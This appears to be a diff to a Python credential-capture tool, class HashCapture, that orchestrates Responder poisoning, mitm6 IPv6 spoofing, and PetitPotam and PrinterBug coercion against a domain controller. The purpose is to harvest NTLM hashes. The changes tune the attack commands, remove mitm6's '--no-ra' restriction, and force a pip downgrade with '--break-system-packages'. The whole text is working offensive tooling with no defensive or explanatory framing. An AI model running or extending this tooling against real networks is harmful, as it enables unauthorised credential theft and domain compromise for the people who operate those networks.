@@ -241,9 +241,7 @@ class HashCapture:
             cmd = [
                 "responder",
                 "-I", self.interface,
-                "-w",  # Enable WinPopup spoofing
-                "-f",  # Enable file server
-                "-d"   # Enable DHCP
+                "-wd"  # Combined flags for WinPopup and DHCP
             ]
 
             self.logger.info(f"Starting Responder with command: {' '.join(cmd)}")
@@ -277,18 +275,17 @@ class HashCapture:
             # Install required dependencies
             try:
                 subprocess.check_call([
-                    "pip", "install", 
-                    "service_identity",
+                    "pip", "install",
+                    "--no-deps", "mitm6==0.2.2",
                     "--break-system-packages"
                 ])
             except:
-                self.logger.warning("Could not install service_identity module")
+                self.logger.warning("Could not downgrade mitm6")
 
             cmd = [
                 "mitm6",
                 "-i", self.interface,
-                "--debug",
-                "--no-ra"  # Disable router advertisements
+                "--debug"
             ]
             
             if self.domain:
@@ -296,7 +293,8 @@ class HashCapture:
             
             self.logger.info(f"Starting mitm6 with command: {' '.join(cmd)}")
             env = os.environ.copy()
-            env["PYTHONIOENCODING"] = "utf-8"
+            env["PYTHONIOENCODING"] = "latin1"
+            env["PYTHONUNBUFFERED"] = "1"
             
             process = Popen(
                 cmd,
@@ -329,8 +327,8 @@ class HashCapture:
 
             cmd = [
                 "petitpotam.py",
-                self.local_ip,  # Listener
-                self.dc_ip,     # Target
+                self.local_ip,     # Listener
+                self.dc_ip,        # Target
                 "-pipe", "lsarpc",
                 "-no-pass"
             ]
@@ -366,7 +364,7 @@ class HashCapture:
 
             cmd = [
                 "printerbug.py",
-                f"{self.domain}/anonymous:{self.dc_ip}",
+                f"{self.domain}/anonymous@{self.dc_ip}",
                 self.local_ip,
                 "-no-pass"
             ]
